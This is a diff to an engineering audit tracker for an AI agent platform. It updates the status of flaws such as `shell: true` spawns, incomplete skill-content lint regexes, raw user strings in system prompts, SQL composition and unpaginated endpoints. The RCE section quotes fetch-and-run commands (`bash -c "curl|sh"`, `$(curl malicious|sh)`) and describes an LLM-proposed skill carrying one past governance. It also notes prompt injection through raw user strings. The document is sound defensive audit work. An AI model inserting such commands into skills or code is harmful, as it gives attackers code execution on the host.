@@ -19,12 +19,12 @@
 | **P0** | [C2 · Silent error swallowing](#c2--silent-error-swallowing) | 🟡 partial | State drifts from DB for minutes before detection | Persistence, heartbeats, audit, event-bridge |
 | **P0** | [C3 · Fire-and-forget on critical paths](#c3--fire-and-forget-on-critical-paths) | 🟡 partial | Skill pipelines, trust updates, cross-sprint transfers silently vanish | Skills, sprints, heartbeats, hippocampus |
 | **P0** | [C4 · Security — governance off + no auth](#c4--security--governance-off--no-auth) | 🟡 partial | Any network client can wipe/boot/halt the engine | Beat executor + all route files |
-| **P0** | [C5 · RCE / injection vectors](#c5--rce--injection-vectors) | 🔴 open | `shell: true`, skill content lint bypass, pgvector SQL compose, raw err.message | OpenCode, skill governance, hippocampus, routes |
+| **P0** | [C5 · RCE / injection vectors](#c5--rce--injection-vectors) | 🟡 partial | `shell: true`, skill content lint bypass, pgvector SQL compose, raw err.message | OpenCode, skill governance, hippocampus, routes |
 | **P1** | [C6 · Module-level mutable state TOCTOUs](#c6--module-level-mutable-state-toctous) | 🟡 partial | Duplicate proposals, duplicate bridges, event-bridge flag stuck | 14+ module-level `let` vars |
 | **P1** | [C7 · No AbortSignal / crash recovery](#c7--no-abortsignal--no-crash-recovery) | 🟡 partial | SIGTERM, hung LLMs, OpenCode child leaks, stranded beats | Everywhere |
 | **P1** | [C8 · Non-atomic multi-step writes](#c8--non-atomic-multi-step-writes) | 🟡 partial | Cache vs DB divergence; partial sprints, orphan artifacts | Trust+task, meeting, sprint approve, artifact propagation |
 | **P1** | [C9 · Unbounded memory growth](#c9--unbounded-memory-growth) | 🟡 partial | Server OOMs after N sprints | Artifacts array, audit ledger, activity log, graph store |
-| **P1** | [C10 · O(n²) + no pagination](#c10-n-scans--no-pagination) | 🔴 open | Latency spike as sprint size grows; payload blow-up | Task deps, checklist scans, list endpoints |
+| **P1** | [C10 · O(n²) + no pagination](#c10-n-scans--no-pagination) | 🟡 partial | Latency spike as sprint size grows; payload blow-up | Task deps, checklist scans, list endpoints |
 | **P1** | [C18 · Database layer (packages/db)](#c18--database-layer--packagesdb) | 🟡 partial | jsonb blob schema, missing FKs + indexes, migration races, pool discipline | `packages/db/*` |
 | **P2** | [C11 · Stringly-typed roles/actions/phases](#c11--stringly-typed-rolesactionsphases) | 🔴 open | Refactors silently drop roles; typos = bugs | ~80+ sites across 10+ files |
 | **P2** | [C12 · Type-safety leaks (`as any`, `z.unknown()`)](#c12--type-safety-leaks) | ✅ closed | Runtime-only guarantees; schema drift | `request.body as {…}`, contracts events, roleTools |
@@ -211,14 +211,15 @@ Tests: `packages/db/src/repos/locks.test.ts` — 10 concurrency tests (Pattern A
 
 **Root cause:** several privilege-escalation paths that only luck has kept out of prod.
 
-| Vector | Where | Flaw IDs |
-|---|---|---|
-| `spawn(..., { shell: true })` | [opencode.ts](apps/api/src/infra/opencode.ts) | F-063 |
-| `npm run build` / child scripts pass user-controllable env | [opencode.ts](apps/api/src/infra/opencode.ts) / workspace manager | F-087 |
-| Skill-content shell lint patterns are incomplete | [governance.ts:44-54](apps/api/src/skills/governance.ts) — incomplete regexes miss Unicode homoglyphs, double-escaped backticks, `bash -c "curl|sh"` in prose | F-330 |
-| Habit-ID SQL composition via `sql.join()` + template strings | [pgvector.ts:389-401](packages/hippocampus/src/backends/pgvector.ts) | F-406 |
-| User-controlled strings concatenated into system prompts raw | [ceo.ts:374-395](apps/api/src/agents/ceo.ts), [developer.ts](apps/api/src/prompts/developer.ts), [specialist.ts](apps/api/src/prompts/specialist.ts) | F-318 (+ cluster) |
-| Raw `err.message` back to client | Route layer (10+ handlers) | F-429 |
+| Vector | Where | Flaw IDs | Status |
+|---|---|---|---|
+| `spawn(..., { shell: true })` | [opencode.ts](apps/api/src/infra/opencode.ts) | F-063 | ✅ closed — POSIX uses `shell: false`; Windows-only conditional retained for `.cmd` shim resolution |
+| `npm run build` / child scripts pass user-controllable env | [opencode.ts](apps/api/src/infra/opencode.ts) / workspace manager | F-087 | 🔴 open |
+| Skill-content shell lint patterns are incomplete | [governance.ts:44-54](apps/api/src/skills/governance.ts) — incomplete regexes miss Unicode homoglyphs, double-escaped backticks, `bash -c "curl\|sh"` in prose | F-330 | 🔴 open |
+| Habit-ID SQL composition via `sql.join()` + template strings | [pgvector.ts:389-401](packages/hippocampus/src/backends/pgvector.ts) | F-406 | 🔴 open |
+| User-controlled strings concatenated into system prompts raw | [ceo.ts:374-395](apps/api/src/agents/ceo.ts), [developer.ts](apps/api/src/prompts/developer.ts), [specialist.ts](apps/api/src/prompts/specialist.ts) | F-318 (+ cluster) | 🔴 open |
+| Raw `err.message` back to client | Route layer (10+ handlers) | F-429 | ✅ closed (commit `99df907` — `sanitizeError()` helper) |
+| Other `shell: true` sites (preview.ts, control-plane.ts, verification-gate.ts, workspaces.routes.ts) | 4 sites | (not in F-063 audit, but related) | 🔴 open — workspace command spawn (preview.ts) is by-design "run user's code"; the other 3 are mechanical argv refactors |
 
 **Why it matters:** approved skill runs shell. Lint misses one pattern. LLM suggests `$(curl malicious|sh)` inside a proposed skill; governance signs off; bash executes. Dead end.
 
@@ -302,17 +303,20 @@ Tests: `packages/db/src/repos/locks.test.ts` — 10 concurrency tests (Pattern A
 
 **Root cause:** repeated linear `.find()` inside `.filter()`, repeated `getSnapshot()` per function, no pre-indexing on snapshot construction; every list endpoint returns the whole array.
 
-| Site | Cost | Flaw IDs |
-|---|---|---|
-| Task-dep lookups — `tasks.filter(id ⇒ tasks.find(id))` twice | O(n²) per beat | F-198, F-298, F-324, F-378 |
-| Checklist — 14 `ctx.tasks.filter(...)` per developer beat | Repeated scans | F-245 |
-| `setTaskStatus` — 3-5 `getSnapshot()` calls per call | Redundant snapshot builds | F-385 |
-| Skill registry — `getAllSkills` full-scans per health check; rebuild `activeSkillIndex` on every register | O(n²) on writes | F-336, F-337 |
-| Event-bridge per-event policy load | N+1 DB queries on high-volume streams | F-294 |
-| Pgvector `cosineDistance` without index hint | Full table scan on every retrieval | F-411 |
-| List routes — 16 endpoints return unbounded arrays | Large payloads + clients force-cache | F-432 |
+| Site | Cost | Flaw IDs | Status |
+|---|---|---|---|
+| Task-dep lookups — `tasks.filter(id ⇒ tasks.find(id))` twice | O(n²) per beat | F-198, F-298, F-324, F-378 | 🔴 deferred (perf-only, scale-dependent) |
+| Checklist — 14 `ctx.tasks.filter(...)` per developer beat | Repeated scans | F-245 | 🔴 deferred |
+| `setTaskStatus` — 3-5 `getSnapshot()` calls per call | Redundant snapshot builds | F-385 | 🔴 bundled with C14 PR 10 (mutations.ts split) |
+| Skill registry — `getAllSkills` full-scans per health check; rebuild `activeSkillIndex` on every register | O(n²) on writes | F-336, F-337 | 🔴 deferred |
+| Event-bridge per-event policy load | N+1 DB queries on high-volume streams | F-294 | 🔴 deferred |
+| Pgvector `cosineDistance` without index hint | Full table scan on every retrieval | F-411 | ✅ **incorrectly classified — index existed from migration 0000.** Verified pgvector 0.8.2 + `memory_embeddings_embedding_idx` (ivfflat, vector_cosine_ops, lists=100) on local DB. |
+| List routes — 16 endpoints return unbounded arrays | Large payloads + clients force-cache | F-432 | 🟠 **carve-out: ship hard cap now** (cursor pagination defer) |
 
-**Fix pattern:** pre-index on `AgentBeatContext` construction (`byStatus`, `byId`, `byAssignee`); pass precomputed indexes into checks; add HNSW/IVFFlat indexes for pgvector; cursor-paginate every list route with a 500 hard cap.
+**Fix pattern:** pre-index on `AgentBeatContext` construction (`byStatus`, `byId`, `byAssignee`); pass precomputed indexes into checks; cursor-paginate every list route with a 500 hard cap.
+
+**Ship-now carve-out (rest defer until scale demands):**
+- F-432 (partial): global `HARD_LIST_CAP = 500` middleware on all 16 list endpoints. Prevents accidental DoS / payload bloat without a full cursor-pagination refactor.
 
 ---
 
